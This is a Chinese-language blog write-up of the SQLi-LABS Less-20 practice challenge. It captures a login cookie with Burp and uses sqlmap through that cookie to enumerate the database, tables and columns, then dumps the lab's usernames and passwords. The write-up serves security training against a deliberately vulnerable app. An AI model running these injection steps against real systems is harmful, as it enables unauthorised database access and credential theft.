---
layout: post
title: "cookie-injections-sqlmap"
date: 2019-05-20
author: jjnoob
categories:
- 2019-05
tags:
- sqli
- sqlmap
- cookie
---

* content
{:toc}

题目地址: SQLi-LABS Page-1(Basic Challenges) -> Less-20 


# cookie
用户和密码都输入`admin`

burp抓包, proxy里面查看cookie:
```
GET /Less-20/index.php HTTP/1.1
Host: 43.247.91.228:84
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://43.247.91.228:84/Less-20/index.php
Connection: keep-alive
Cookie: uname=admin
Upgrade-Insecure-Requests: 1
```

登陆的cookie是`uname=admin`


<br />

# sqlmap

## 尝试
```
sqlmap.py -u "http://43.247.91.228:84/Less-20/index.php" --cookie "uname=admin" --level=2
```

> * HTTP Cookie在level为2及以上的时候会测试.
> * HTTP User-Agent/Referer头在level为3及以上的时候会测试.


返回:
```
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.5
```

## 爆库
```
sqlmap -u "http://43.247.91.228:84/Less-20/index.php" --cookie "uname=admin" --level=2 --current-db
```

返回:
```
current database: 'security'
```

## 爆表
```
sqlmap -u "http://43.247.91.228:84/Less-20/index.php" --cookie "uname=admin" -D security --tables --level=2
```

返回:
```
Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+
```

## 爆字段
```
sqlmap -u "http://43.247.91.228:84/Less-20/index.php" --cookie "uname=admin" -D security -T users --columns --level=2
```

返回:
```
Database: security
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+
```

## 查看字段信息
```
sqlmap -u "http://43.247.91.228:84/Less-20/index.php" --cookie "uname=admin" -D security -T users -C password,username --level=2 --dump
```

返回:
```
Database: security
Table: users
[13 entries]
+------------+----------+
| password   | username |
+------------+----------+
| Dumb       | Dumb     |
| I-kill-you | Angelina |
| p@ssword   | Dummy    |
| crappy     | secure   |
| stupidity  | stupid   |
| genious    | superman |
| mob!le     | batman   |
| admin      | admin    |
| admin1     | admin1   |
| admin2     | admin2   |
| admin3     | admin3   |
| dumbo      | dhakkan  |
| admin4     | admin4   |
+------------+----------+
```
